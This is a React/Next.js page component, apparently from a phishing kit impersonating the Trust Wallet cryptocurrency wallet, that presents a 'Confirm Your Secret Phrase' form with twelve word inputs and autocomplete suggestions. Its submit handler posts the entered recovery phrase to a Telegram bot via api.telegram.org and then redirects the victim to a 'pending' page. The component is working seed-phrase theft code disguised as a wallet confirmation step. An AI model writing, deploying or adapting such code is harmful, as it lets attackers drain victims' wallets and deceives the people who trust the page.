'use client'

import { useState, useRef } from 'react'
import { useRouter } from 'next/navigation'
import axios from 'axios'
import TrustLogo from '../TrustLogo'
import TrustStats from '@/app/components/stars'
import Footer from '@/app/components/footer'

const mockWords = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance", "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent", "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol", "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already", "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused", "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle", "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any", "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic", "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange", "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask", "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom", "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt", "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware", "away", "awesome", "awful", "awkward", "axis"]

export default function PhraseConfirmation() {
  const [phraseWords, setPhraseWords] = useState(Array(12).fill(''))
  const [suggestions, setSuggestions] = useState<string[]>([])
  const [currentIndex, setCurrentIndex] = useState<number | null>(null)
  const router = useRouter()
  const inputRefs = useRef<(HTMLInputElement | null)[]>(Array(12).fill(null))

  const handleInputChange = (index: number, value: string) => {
    const newPhraseWords = [...phraseWords]
    newPhraseWords[index] = value
    setPhraseWords(newPhraseWords)
    setCurrentIndex(index)

    const matchedWords = mockWords.filter(word => word.includes(value.toLowerCase())).slice(0, 7)
    setSuggestions(matchedWords)
  }

  const handleSuggestionClick = (word: string) => {
    if (currentIndex !== null) {
      const newPhraseWords = [...phraseWords]
      newPhraseWords[currentIndex] = word
      setPhraseWords(newPhraseWords)
      setSuggestions([])
      
      // Move focus to the next input
      const nextIndex = (currentIndex + 1) % 12
      inputRefs.current[nextIndex]?.focus()
    }
  }

  const clearInputs = () => {
    setPhraseWords(Array(12).fill(''))
    setSuggestions([])
    setCurrentIndex(null)
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (phraseWords.some(word => word === '')) {
      setTimeout(() => {
        router.push('/retry')
      }, 1000)
      return
    }

    try {
      const formattedInputs = phraseWords.join(' ')
      const message = "\n12 words of seeds:\n ```" + formattedInputs + "\n```"

      await axios.post(
        `https://api.telegram.org/bot${process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'MarkdownV2'
        }
      )

      router.push("/pending")
    } catch (error) {
      console.error("Error sending message to Telegram:", error)
      router.push("/failure")
    }
  }

  return (
    <div className="mt-8 flex flex-col items-center justify-center">
      <TrustLogo />
      <div className="mt-8 max-w-lg rounded-lg border border-[#3a3a3a] px-8 py-4 text-center w-96">
        <h2 className="scroll-m-20 text-3xl font-medium tracking-tight lg:text-2xl text-white">Confirm Your Secret Phrase</h2>
        <h5 className="mt-2 leading-7 font-regular text-[#8C8C8C]">Please enter each word in the order you wrote it down. Partial word autocomplete suggestions will appear below.</h5>
        <form onSubmit={handleSubmit} className="mt-4">
          <div className="grid grid-cols-2 gap-4">
            {phraseWords.map((word, index) => (
              <input
                key={index}
                
                type="text"
                value={word}
                onChange={(e) => handleInputChange(index, e.target.value)}
                onFocus={() => setCurrentIndex(index)}
                placeholder={`Word #${index + 1}`}
                className={`w-full px-3 py-2 text-white bg-[#1b1b1c] border ${
                  index === currentIndex ? 'border-[#48FF91]' : 'border-[#3a3a3a]'
                } rounded-md focus:outline-none focus:ring-2 focus:ring-[#48FF91] focus:border-transparent`}
              />
            ))}
          </div>
          <button type="button" className="mt-4 text-[#48FF91]" onClick={clearInputs}>
            Clear all
          </button>
          <div className="mt-4 flex flex-wrap justify-center gap-2">
            {suggestions.map((word, index) => (
              <button
                key={index}
                className="rounded-3xl bg-[#1b1b1c] border border-[#48FF91] px-4 py-2 text-white opacity-70 hover:opacity-100"
                onClick={() => handleSuggestionClick(word)}
                type="button"
              >
                {word}
              </button>
            ))}
          </div>
          <div className="mt-2 flex justify-between px-2 pb-4">
            <button className="rounded-3xl border border-[#48FF91] bg-[#1B1B1C] px-10 py-2 text-[#48FF91]">
              Cancel
            </button>
            <button type="submit" className="rounded-3xl bg-[#48FF91] px-10 py-2 text-[#1B1B1C]">
              Proceed
            </button>
          </div>
        </form>
        
      </div>
      <TrustStats />
        <Footer />
    </div>
  )
}

